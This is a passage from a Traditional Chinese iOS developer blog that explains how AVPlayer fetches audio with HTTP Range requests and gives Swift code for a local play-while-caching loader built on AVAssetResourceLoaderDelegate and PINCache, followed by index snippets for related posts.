Range、 Keep-Alive ？ 那也不用搞這麼多了，直接自己用 URLSession 下載完 mp3 檔案塞給播放器就好….但這不是我們要的結果，可以請後端幫忙修改伺服器設定。前導知識 (2) — AVPlayer 原生是如何處理 AVURLAsset 資源？當我們使用 AVURLAsset init with URL 資源並賦予給 AVPlayer/AVQueuePlayer 開始播放之後，同上所述，首先會用 GET Range 0–1 去取得是否支援 Range 範圍請求、資源總長度、檔案類型這三個資訊。有了檔案資訊後，會再發起第二次請求，請求從 0-總長度 的資料。 ⚠️ AVPlayer 會請求從 0-總長度 的資料，並透過實時取得已下載的資料特性 ( 16 kb、16 kb、16 kb…) 取得到他覺得資料足夠後，會發起 Cancel 取消這個網路請求 （所以實際也不會拿完，除非檔案太小）。 繼續播放後才會透過 Range 往後請求資料。 （這部分跟我之前想的不一樣，我以為會是0–100、100–200. .這樣請求）AVPlayer 請求範例：1. GET Range 0-1 =&gt; Response: 總長度 150000 / public.mp3 / true2. GET 0-150000...3. 16 kb receive4. 16 kb receive...5. cancel() // current offset is 7006. 繼續播放7. GET 700-150000...8. 16 kb receive9. 16 kb receive...10. cancel() // current offset is 150011. 繼續播放12. GET 1500-150000...13. 16 kb receive14. 16 kb receive...16. If seek to...500017. cancel(12.) // current offset is 200018. GET 5000-150000...19. 16 kb receive20. 16 kb receive...... ⚠️ iOS ≤12 的情況下，會先發幾個較短的請求試著摸摸看（？然後才會發要求到總長度的請求； iOS ≥ 13 則會直接發要求到總長度的請求。還有個題外的坑，就是在觀察怎麼拿資源的時候，我使用了 mitmproxy 工具嗅探，結果發現它顯示有錯，會等到 response 全部回來才會顯示，而不是顯示分段、使用持久連接接續下載；害我嚇了一大跳！以為 iOS 很笨居然每次都要整個檔案回來！下次要用工具時要有保持一點懷疑 OrzCancel 發起的時機 前面說到的第二次請求，請求從 0 開始 到總長度的資源，有足夠 Data 後會發起 Cancel 取消請求。 Seek 時會先發起 Cancel 取消先前的請求。 ⚠️ 在 AVQueuePlayer 中切換到下一個資源、AVPlayer 更換播放資源時並不會發起 Cancel 取消前一首的請求。AVQueue Pre-buffering其實也是同樣呼叫 Resource Loader 處理，只是他要求的資料範圍會比較小。實現有了以上前導知識後我們來看實現 AVPlayer 本地 Cache 功能的原理方式。就是之前有提到的 AVAssetResourceLoaderDelegate ，這個接口讓我們能 自行實踐 Resource Loader 給 Asset 用。Resource Loader 實際就是個打工仔，播放器是要檔案資訊還是檔案資料，範圍哪裡都哪裡都是他告訴我們，我們去做就是。 看到有範例是一個 Resource Loader 服務所有 AVURLAsset ，我覺得是錯的，應該要一個 Resource Loader 服務一個 AVURLAsset，跟著 AVURLAsset 的生命週期，他本來就屬於 AVURLAsset。 一個 Resource Loader 服務所有 AVURLAsset 在 AVQueuePlayer 上會變得非常複雜且難以管理。進入自訂的 Resource Loader 的時機點要注意的是不是實踐了自己的 Resource Loader 他就會理你，只有當系統無法辨識處理這個資源的時候，才會走你的 Resource Loader。所以我們在將 URL 資源給予 AVURLAsset 之前要先將 Scheme 換成我們自訂的 Scheme，不能是 http/https… 這些系統能處理的 Scheme。http://zhgchg.li/music.mp3 =&gt; cacheable://zhgchg.li/music.mp3AVAssetResourceLoaderDelegate只有兩個方法需要實現： func resourceLoader( _ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest : AVAssetResourceLoadingRequest) -&gt; Bool :此方法問我們能不能處理此資源，return true 能，return false 我們也不處理（unsupported url）。我們能從 loadingRequest 取出要請求什麼（第一次請求檔案資訊還是請求資料，請求資料的話 Range 是多少到多少）；知道請求後我們自行發起請求去拿資料， 在這我們就能決定要發起 URLSession 還是從本地返回 Data 。另外也能在此做 Data 加解密操作，保護原始資料。 func resourceLoader( _ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest : AVAssetResourceLoadingRequest) :前述說到的 Cancel 發起時機 發起 Cancel 時…我們可以在這去取消正在請求的 URLSession。本地 Cache 實現方式Cache 的部分我直接使用 PINCache ，將 Cache 工作交由他處理，免去我們要處理 Cache 讀寫 DeadLock、清除 Cache LRU 策略 實作上的問題。 ️️⚠️️️️️️️️️️️OOM警告！ 因為這邊是針對音樂做 Cache 檔案大小頂多 10 MB 上下，所以才能使用 PINCache 作為本地 Cache 工具；如果是要服務影片就無法使用此方法（可能一次要載入好幾 GB 的資料到記憶體）有這部分需求可參考大大的做法，用 FileHandle seek read/write 的特性進行處理。開工！不囉唆，先上完整專案：AssetData本地 Cache 資料物件映射實現 NSCoding，因 PINCache 是依賴 archivedData 方法 encode/decode。import Foundationimport CryptoKitclass AssetDataContentInformation: NSObject, NSCoding { @objc var contentLength: Int64 = 0 @objc var contentType: String = \"\" @objc var isByteRangeAccessSupported: Bool = false func encode(with coder: NSCoder) { coder.encode(self.contentLength, forKey: #keyPath(AssetDataContentInformation.contentLength)) coder.encode(self.contentType, forKey: #keyPath(AssetDataContentInformation.contentType)) coder.encode(self.isByteRangeAccessSupported, forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) } override init() { super.init() } required init?(coder: NSCoder) { super.init() self.contentLength = coder.decodeInt64(forKey: #keyPath(AssetDataContentInformation.contentLength)) self.contentType = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.contentType)) as? String ?? \"\" self.isByteRangeAccessSupported = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) as? Bool ?? false }}class AssetData: NSObject, NSCoding { @objc var contentInformation: AssetDataContentInformation = AssetDataContentInformation() @objc var mediaData: Data = Data() override init() { super.init() } func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) coder.encode(self.mediaData, forKey: #keyPath(AssetData.mediaData)) } required init?(coder: NSCoder) { super.init() self.contentInformation = coder.decodeObject(forKey: #keyPath(AssetData.contentInformation)) as? AssetDataContentInformation ?? AssetDataContentInformation() self.mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data ?? Data() }}AssetData 存放： contentInformation : AssetDataContentInformationAssetDataContentInformation ：存放 是否支援 Range 範圍請求(isByteRangeAccessSupported)、資源總長度(contentLength)、檔案類型(contentType) mediaData : 原始音訊 Data （這邊檔案太大會 OOM）PINCacheAssetDataManager封裝 Data 存入、取出 PINCache 邏輯。import PINCacheimport Foundationprotocol AssetDataManager: NSObject { func retrieveAssetData() -&gt; AssetData? func saveContentInformation(_ contentInformation: AssetDataContentInformation) func saveDownloadedData(_ data: Data, offset: Int) func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data?}extension AssetDataManager { func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data? { if offset &lt;= from.count &amp;&amp; (offset + with.count) &gt; from.count { let start = from.count - offset var data = from data.append(with.subdata(in: start..&lt;with.count)) return data } return nil }}//class PINCacheAssetDataManager: NSObject, AssetDataManager { static let Cache: PINCache = PINCache(name: \"ResourceLoader\") let cacheKey: String init(cacheKey: String) { self.cacheKey = cacheKey super.init() } func saveContentInformation(_ contentInformation: AssetDataContentInformation) { let assetData = AssetData() assetData.contentInformation = contentInformation PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } func saveDownloadedData(_ data: Data, offset: Int) { guard let assetData = self.retrieveAssetData() else { return } if let mediaData = self.mergeDownloadedDataIfIsContinuted(from: assetData.mediaData, with: data, offset: offset) { assetData.mediaData = mediaData PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } } func retrieveAssetData() -&gt; AssetData? { guard let assetData = PINCacheAssetDataManager.Cache.object(forKey: cacheKey) as? AssetData else { return nil } return assetData }}這邊多抽出 Protocol 因為未來可能使用其他儲存方式替代 PINCache，所以其他程式在使用時是依賴 Protocol 而非 Class 實體。 ⚠️ mergeDownloadedDataIfIsContinuted 這個方法極其重要。照線性播放只要一直 append 新 Data 到 Cache Data 中即可，但現實情況複雜得多，使用者可能播了 Range 0~100，直接 Seek 到 Range 200–500 播放；如何將已有的 0-100 Data 與新的 200–500 Data 合併就是一個很大的問題。 ⚠️Data 合併有問題會出現可怕的播放鬼畜問題….這邊的答案是， 我們不處理非連續資料 ；因為敝專案僅為音訊，檔案也就幾 MB (≤ 10MB) 以考量開發成本就沒做了，我只處理合併連續的資料（例如目前已有 0~100，新資料是 75~200，合併之後變0~200；如果新資料是 150~200，我則會忽略不合併處理）如果要考慮非連續合併，除了在儲存上要使用其他方法（要有辦法辨識空缺部分）；在 Request 時也要能 Query 出哪段需要發網路請求去拿、哪段是從本地拿；要考量到這情況實作會非常複雜。圖片取自： iOS AVPlayer 视频缓存的设计与实现CachingAVURLAssetAVURLAsset 是 weak 持有 ResourceLoader Delegate，所以這邊建議自己建立一個 AVURLAsset Class 繼承自 AVURLAsset，在內部建立、賦予、持有 ResourceLoader ，讓他跟著 AVURLAsset 的生命週期；另外也可以儲存原始 URL、CacheKey 等資訊…。class CachingAVURLAsset: AVURLAsset { static let customScheme = \"cacheable\" let originalURL: URL private var _resourceLoader: ResourceLoader? var cacheKey: String { return self.url.lastPathComponent } static func isSchemeSupport(_ url: URL) -&gt; Bool { guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return false } return [\"http\", \"https\"].contains(components.scheme) } override init(url URL: URL, options: [String: Any]? = nil) { self.originalURL = URL guard var components = URLComponents(url: URL, resolvingAgainstBaseURL: false) else { super.init(url: URL, options: options) return } components.scheme = CachingAVURLAsset.customScheme guard let url = components.url else { super.init(url: URL, options: options) return } super.init(url: url, options: options) let resourceLoader = ResourceLoader(asset: self) self.resourceLoader.setDelegate(resourceLoader, queue: resourceLoader.loaderQueue) self._resourceLoader = resourceLoader }}使用：if CachingAVURLAsset.isSchemeSupport(url) { let asset = CachingAVURLAsset(url: url) let avplayer = AVPlayer(asset) avplayer.play()}其中 isSchemeSupport() 是用來判斷 URL 是否支援掛我們的 Resource Loader（排除 file:// ）。originalURL 存放原始資源 URL。cacheKey 存放這個資源的 Cache Key，這邊直接用檔案名稱當 Cache Key。cacheKey 請依照現實場景做調整，如果檔案名稱未 hash 可能重複就建議先 hash 後當 key 避免碰撞；如果要 hash 整個 URL 當 key 也要注意 URL 是否會變動 (例如有用 CDN)。Hash 可使用 md5…sha. .，iOS ≥ 13 可直接使用 Apple 的 CryptoKit ，其他就上 Github 找吧！ResourceLoaderRequestimport Foundationimport CoreServicesprotocol ResourceLoaderRequestDelegate: AnyObject { func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;)}class ResourceLoaderRequest: NSObject, URLSessionDataDelegate { struct RequestRange { var start: Int64 var end: RequestRangeEnd enum RequestRangeEnd { case requestTo(Int64) case requestToEnd } } enum RequestType { case contentInformation case dataRequest } struct ResponseUnExpectedError: Error { } private let loaderQueue: DispatchQueue let originalURL: URL let type: RequestType private var session: URLSession? private var dataTask: URLSessionDataTask? private var assetDataManager: AssetDataManager? private(set) var requestRange: RequestRange? private(set) var response: URLResponse? private(set) var downloadedData: Data = Data() private(set) var isCancelled: Bool = false { didSet { if isCancelled { self.dataTask?.cancel() self.session?.invalidateAndCancel() } } } private(set) var isFinished: Bool = false { didSet { if isFinished { self.session?.finishTasksAndInvalidate() } } } weak var delegate: ResourceLoaderRequestDelegate? init(originalURL: URL, type: RequestType, loaderQueue: DispatchQueue, assetDataManager: AssetDataManager?) { self.originalURL = originalURL self.type = type self.loaderQueue = loaderQueue self.assetDataManager = assetDataManager super.init() } func start(requestRange: RequestRange) { guard isCancelled == false, isFinished == false else { return } self.loaderQueue.async { [weak self] in guard let self = self else { return } var request = URLRequest(url: self.originalURL) self.requestRange = requestRange let start = String(requestRange.start) let end: String switch requestRange.end { case .requestTo(let rangeEnd): end = String(rangeEnd) case .requestToEnd: end = \"\" } let rangeHeader = \"bytes=\\(start)-\\(end)\" request.setValue(rangeHeader, forHTTPHeaderField: \"Range\") let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil) self.session = session let dataTask = session.dataTask(with: request) self.dataTask = dataTask dataTask.resume() } } func cancel() { self.isCancelled = true } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) { guard self.type == .dataRequest else { return } self.loaderQueue.async { self.delegate?.dataRequestDidReceive(self, data) self.downloadedData.append(data) } } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) { self.response = response completionHandler(.allow) } func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) { self.isFinished = true self.loaderQueue.async { if self.type == .contentInformation { guard error == nil, let response = self.response as? HTTPURLResponse else { let responseError = error ?? ResponseUnExpectedError() self.delegate?.contentInformationDidComplete(self, .failure(responseError)) return } let contentInformation = AssetDataContentInformation() if let rangeString = response.allHeaderFields[\"Content-Range\"] as? String, let bytesString = rangeString.split(separator: \"/\").map({String($0)}).last, let bytes = Int64(bytesString) { contentInformation.contentLength = bytes } if let mimeType = response.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() { contentInformation.contentType = contentType as String } if let value = response.allHeaderFields[\"Accept-Ranges\"] as? String, value == \"bytes\" { contentInformation.isByteRangeAccessSupported = true } else { contentInformation.isByteRangeAccessSupported = false } self.assetDataManager?.saveContentInformation(contentInformation) self.delegate?.contentInformationDidComplete(self, .success(contentInformation)) } else { if let offset = self.requestRange?.start, self.downloadedData.count &gt; 0 { self.assetDataManager?.saveDownloadedData(self.downloadedData, offset: Int(offset)) } self.delegate?.dataRequestDidComplete(self, error, self.downloadedData) } } }}針對 Remote Request 的封裝，主要是服務 ResourceLoader 發起的資料請求。RequestType ：用來區分此 Request 是 第一次請求檔案資訊(contentInformation)、還是請求資料(dataRequest)RequestRange ：請求 Range 範圍，end 可指定到哪(requestTo(Int64) )或全部(requestToEnd)。檔案資訊可由：func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void)中取得 Response Header，另外要注意如果要改 HEAD 去摸，不會進這個要用其他方法接。 isByteRangeAccessSupported ：看 Response Header 中的 Accept-Ranges == bytes contentType ：播放器要的檔案類型資訊，格式是統一類識別符，不是 audio/mpeg ，而是寫作 public.mp3 contentLength ：看 Response Header 中的 Content-Range ：bytes 0–1/ 資源總長度 ⚠️這邊要注意伺服器給的格式大小寫，不一定是寫作 Accept-Ranges/Content-Range；有的伺服器的格式是小寫 accept-ranges、Accept-ranges…補充：如果要考量大小寫可以寫 HTTPURLResponse Extensionimport CoreServicesextension HTTPURLResponse { func parseContentLengthFromContentRange() -&gt; Int64? { let contentRangeKeys: [String] = [ \"Content-Range\", \"content-range\", \"Content-range\", \"content-Range\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString, let contentLengthString = rangeString.split(separator: \"/\").map({String($0)}).last, let contentLength = Int64(contentLengthString) else { return nil } return contentLength } func parseAcceptRanges() -&gt; Bool? { let contentRangeKeys: [String] = [ \"Accept-Ranges\", \"accept-ranges\", \"Accept-ranges\", \"accept-Ranges\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString else { return nil } return rangeString == \"bytes\" || rangeString == \"Bytes\" } func mimeTypeUTI() -&gt; String? { guard let mimeType = self.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() else { return nil } return contentType as String }}使用： contentLength = response.parseContentLengthFromContentRange( ) isByteRangeAccessSupported = response.parseAcceptRanges( ) contentType = response.mimeTypeUTI( )func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data)同前導知識所述，會實時取得已下載的資料，所以這個方法會一直進，片段片段的拿到 Data；我們將他 append 進 downloadedData 存放。func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?)任務取消或結束時都會進這個方法，在這將已下載的資料保存下來。如前導知識中提到的 Cancel 機制，因播放器在拿到足夠資料後就會發起 Cancel，Cancel Request；所以進到這個方法時實際會是 error = NSURLErrorCancelled ，因此不管 error 我們有拿到資料都會嘗試存下來。 ⚠️ 因 URLSession 會用並行方式出去請求資料，所以請保持操作都在DispatchQueue裡，避免資料錯亂(資料錯亂一樣會出現可怕的播放鬼畜)。 ️️⚠️URLSession 沒有呼叫 finishTasksAndInvalidate 或 invalidateAndCancel 兩個方法都會強持有物件導致 Memory Leak；所以不管是取消或是完成我們都要呼叫，這樣才能在任務結束釋放 Request。 ️️⚠️️️️️️️️️️️如果怕 downloadedData OOM，可以在 didReceive Data 中就存入本地。ResourceLoaderimport AVFoundationimport Foundationclass ResourceLoader: NSObject { let loaderQueue = DispatchQueue(label: \"li.zhgchg.resourceLoader.queue\") private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] private let cacheKey: String private let originalURL: URL init(asset: CachingAVURLAsset) { self.cacheKey = asset.cacheKey self.originalURL = asset.originalURL super.init() } deinit { self.requests.forEach { (request) in request.value.cancel() } }}extension ResourceLoader: AVAssetResourceLoaderDelegate { func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool { let type = ResourceLoader.resourceLoaderRequestType(loadingRequest) let assetDataManager = PINCacheAssetDataManager(cacheKey: self.cacheKey) if let assetData = assetDataManager.retrieveAssetData() { if type == .contentInformation { loadingRequest.contentInformationRequest?.contentLength = assetData.contentInformation.contentLength loadingRequest.contentInformationRequest?.contentType = assetData.contentInformation.contentType loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = assetData.contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() return true } else { let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) if assetData.mediaData.count &gt; 0 { let end: Int64 switch range.end { case .requestTo(let rangeEnd): end = rangeEnd case .requestToEnd: end = assetData.contentInformation.contentLength } if assetData.mediaData.count &gt;= end { let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;Int(end)) loadingRequest.dataRequest?.respond(with: subData) loadingRequest.finishLoading() return true } else if range.start &lt;= assetData.mediaData.count { // has cache data...but not enough let subEnd = (assetData.mediaData.count &gt; end) ? Int((end)) : (assetData.mediaData.count) let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;subEnd) loadingRequest.dataRequest?.respond(with: subData) } } } } let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) let resourceLoaderRequest = ResourceLoaderRequest(originalURL: self.originalURL, type: type, loaderQueue: self.loaderQueue, assetDataManager: assetDataManager) resourceLoaderRequest.delegate = self self.requests[loadingRequest]?.cancel() self.requests[loadingRequest] = resourceLoaderRequest resourceLoaderRequest.start(requestRange: range) return true } func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest) { guard let resourceLoaderRequest = self.requests[loadingRequest] else { return } resourceLoaderRequest.cancel() requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader: ResourceLoaderRequestDelegate { func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } switch result { case .success(let contentInformation): loadingRequest.contentInformationRequest?.contentType = contentInformation.contentType loadingRequest.contentInformationRequest?.contentLength = contentInformation.contentLength loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() case .failure(let error): loadingRequest.finishLoading(with: error) } } func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.dataRequest?.respond(with: data) } func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.finishLoading(with: error) requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader { static func resourceLoaderRequestType(_ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestType { if let _ = loadingRequest.contentInformationRequest { return .contentInformation } else { return .dataRequest } } static func resourceLoaderRequestRange(_ type: ResourceLoaderRequest.RequestType, _ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestRange { if type == .contentInformation { return ResourceLoaderRequest.RequestRange(start: 0, end: .requestTo(1)) } else { if loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestToEnd) } else { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 let length = Int64(loadingRequest.dataRequest?.requestedLength ?? 1) let upperBound = lowerBound + length return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestTo(upperBound)) } } }}loadingRequest.contentInformationRequest != nil 則代表是第一次請求，播放器要求先給檔案資訊。請求檔案資訊時我們需要賦予這三項資訊： loadingRequest.contentInformationRequest?.isByteRangeAccessSupported ：是否支援 Range 拿 Data loadingRequest.contentInformationRequest?.contentType ：統一類識別符 loadingRequest.contentInformationRequest?.contentLength ：檔案總長度 Int64loadingRequest.dataRequest?.requestedOffset 可取得要求 Range 的起始 offset。loadingRequest.dataRequest?.requestedLength 可取得要求 Range 的長度。loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true 則不管要求 Range 的長度，直接拿到底。loadingRequest.dataRequest?.respond(with: Data) 返回已載入的 Data 給播放器。loadingRequest.dataRequest?.currentOffset 可取得當前 data offset， dataRequest?.respond(with: Data) 後 currentOffset 會跟著推移。loadingRequest.finishLoading() 資料都載完了，告知播放器。func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool播放器請求資料，我們先看本地 Cache 有無資料，有則返回；若只有部分資料則一樣返回部分，例如我本地有 0–100 ，播放器要求 0–200，則先返回 0–100。若沒有本地 Cache、返回的資料不夠，則會發起 ResourceLoaderRequest 請求從網路拿資料。func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest)播放器取消請求，取消 ResourceLoaderRequest。 你可能有發現 resourceLoaderRequestRange 的 offset 是看 currentOffset ，因為我們會先從本地 dataRequest?.respond(with: Data) 已下載 Data；所以直接看推移後的 offset 即可。func private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] ⚠️ requests 有的範例是只用 currentRequest: ResourceLoaderRequest 來存放，這會有個問題，因為可能當前的 request 正在拿取，使用者又 seek 這時會取消舊的發起新的；但因不一定會照順序發生，可能先走發新請求再走取消；所以用 Dictionary 去存取操作還是比較安全！ ⚠️讓所有操作都在同個 DispatchQueue 防止出現資料鬼畜。deinit 時取消所有還在請求的 requests Resource Loader Deinit 即代表 AVURLAsset Deinit，代表播放器已經不需要這個資源了；所以我們可以 Cancel 還在取資料的 Request，已經載的一樣會寫入 Cache。補充及鳴謝感謝 Lex 汤 大大指點。感謝 外孫女 提供開發上的意見及支持。本篇只針對音樂小檔影片大檔案可能會在 downloadedData、AssetData/PINCacheAssetDataManager 發生 Out Of Memory 問題。同前述，如果要解決這個問題請使用 fileHandler seek read/wirte 去操作本地 Cache 讀取寫入（取代AssetData/PINCacheAssetDataManager）；或找看看 Github 有沒有大 data write/read to file 的專案可用。AVQueuePlayer 切換播放項目時取消正在下載的項目同前導知識中所述，在更換播放目標時是不會發起 Cancel 的；如果是 AVPlayer 會走 AVURLAsset Deinit 所以下載也會中斷；但 AVQueuePlayer 不會，因為都還在 Queue 裡，只是播放目標換到下一首而已。這邊唯一做法就只能接收變換播放目標通知，然後在收到通知後取消上一手的 AVURLAsset loading。asset.cancelLoading()音訊資料加解密音訊加解密可在 ResourceLoaderRequest 中拿到 Data 進行、還有儲存時能在 AssetData 的 encode/decode 對存在本地的 Data進行加解密。CryptoKit SHA 使用範本：class AssetData: NSObject, NSCoding { static let encryptionKeyString = \"encryptionKeyExzhgchgli\" ... func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) if #available(iOS 13.0, *), let encryptionData = try? ChaChaPoly.seal(self.mediaData, using: AssetData.encryptionKey).combined { coder.encode(encryptionData, forKey: #keyPath(AssetData.mediaData)) } else { // } } required init?(coder: NSCoder) { super.init() ... if let mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data { if #available(iOS 13.0, *), let sealedBox = try? ChaChaPoly.SealedBox(combined: mediaData), let decryptedData = try? ChaChaPoly.open(sealedBox, using: AssetData.encryptionKey) { self.mediaData = decryptedData } else { // } } else { // } }}PINCache 相關操作PINCache 包含 PINMemoryCache 和 PINDiskCache，PINCache 會幫我們處理從檔案讀到 Memory 或從 Memory 寫入檔案的事，我們只需要對 PINCache 進行操作。在模擬器中查找 Cache 檔案位置：使用 NSHomeDirectory() 取得模擬器檔案路徑Finder -&gt; 前往 -&gt; 貼上路徑在 Library -&gt; Caches -&gt; com.pinterest.PINDiskCache.ResourceLoader 就是我們建的 Resource Loader Cache 目錄。PINCache(name: “ResourceLoader”) 其中的 name 就是目錄名稱。也可以指定 rootPath ，目錄就可以改到 Documents 底下（不怕被系統清掉）。設定 PINCache 最大上限： PINCacheAssetDataManager.Cache.diskCache.byteCount = 300 * 1024 * 1024 // max: 300mb PINCacheAssetDataManager.Cache.diskCache.byteLimit = 90 * 60 * 60 * 24 // 90 days系統預設上限設 0 的話就不會主動刪除檔案。後記原先太小看這個功能的困難度，以為三兩下就能處理好；結果吃盡苦頭，大概又多花了兩週處理資料儲存的問題，不過也就此徹底了解整個 Resource Loader 運作機制、 GCD 、Data。參考資料最後附上研究如何實作的參考資料 iOS AVPlayer 视频缓存的设计与实现 僅講原理 基于AVPlayer实现音视频播放和缓存，支持视频画面的同步输出 [ SZAVPlayer ] 有附程式（很完整，但很複雜） CachingPlayerItem （簡易實現，較好懂但不完整） 可能是目前最好的 AVPlayer 音视频缓存方案 AVAssetResourceLoaderDelegate 仿抖音 Swift 版 [ Github ]（蠻有意思的專案，復刻抖音 APP；裡面也有用到 Resource Loader） iOS HLS Cache 實踐方法探究之旅延伸 DLCachePlayer (Objective-C 版)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 4,758 Total Views Last Statistics Date: 2025-01-19 | 4,643 Views on Medium. " }, { "title": "AVPlayer 邊播邊 Cache 實戰", "url": "/posts/ee47f8f1e2d2/", "categories": "", "tags": "ios, ios-app-development, cache, avplayer, music-player", "date": "2021-01-05 22:27:52 +0800", "snippet": "[舊]AVPlayer 邊播邊 Cache 實戰摸清 AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegate 的脈絡[2021–01–31] 文章公告：文章編修完成在此要先對所有已讀原本文章的朋友深深一鞠躬道歉，因為自己的魯莽沒有徹底研究完成就發表文章；導致部分內容有誤、浪費您寶貴的時間。目前已從頭把脈絡...", "content": "[舊]AVPlayer 邊播邊 Cache 實戰摸清 AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegate 的脈絡[2021–01–31] 文章公告：文章編修完成在此要先對所有已讀原本文章的朋友深深一鞠躬道歉，因為自己的魯莽沒有徹底研究完成就發表文章；導致部分內容有誤、浪費您寶貴的時間。目前已從頭把脈絡梳理完成，重新撰寫了篇文章；內含完整專案程式共大家參考，謝謝！變更內容： 約 30%新增內容： 約 60% AVPlayer 實踐本地 Cache 功能大全 點我查看===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,854 Total Views Last Statistics Date: 2025-01-19 | 1,138 Views on Medium. " }, { "title": "iOS APP 版本號那些事", "url": "/posts/c4d7c2ce5a8d/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, software-engineering, version-control, software-development", "date": "2020-12-17 22:33:08 +0800", "snippet": "iOS APP 版本號那些事版本號規則及判斷比較解決方案Photo by James Yarema前言所有 iOS APP 開發者都會碰到的兩個數字，Version Number 和 Build Number；最近剛好遇到需求跟版本號有關，要做版本號判斷邀請使用者評價 APP，順便挖掘了一下關於版本號的事；文末也會附上我的版本號判斷解決大全。XCode Help語意化版本 x.y.z首先介紹...", "content": "iOS APP 版本號那些事版本號規則及判斷比較解決方案Photo by James Yarema前言所有 iOS APP 開發者都會碰到的兩個數字，Version Number 和 Build Number；最近剛好遇到需求跟版本號有關，要做版本號判斷邀請使用者評價 APP，順便挖掘了一下關於版本號的事；文末也會附上我的版本號判斷解決大全。XCode Help語意化版本 x.y.z首先介紹「 語意化版本 」這份規範，主要是要解決軟體相依及軟體管理上的問題，如我們很常在使用的 Cocoapods ；假設我今天使用 Moya 4.0，Moya 4.0 使用並依賴 Alamofire 2.0.0，如果今天 Alamofire 有更新了，可能是新功能、可能是修復問題、可能是整個架構重做(不相容舊版)；這時候如果對於版本號沒有一個公共共識規範，將會變得一團亂，因為你不知道哪個版本是相容的、可更新的。語意化版本由三個部分組成： x.y.z x: 主版號 (major)：當你做了不相容的 API 修改 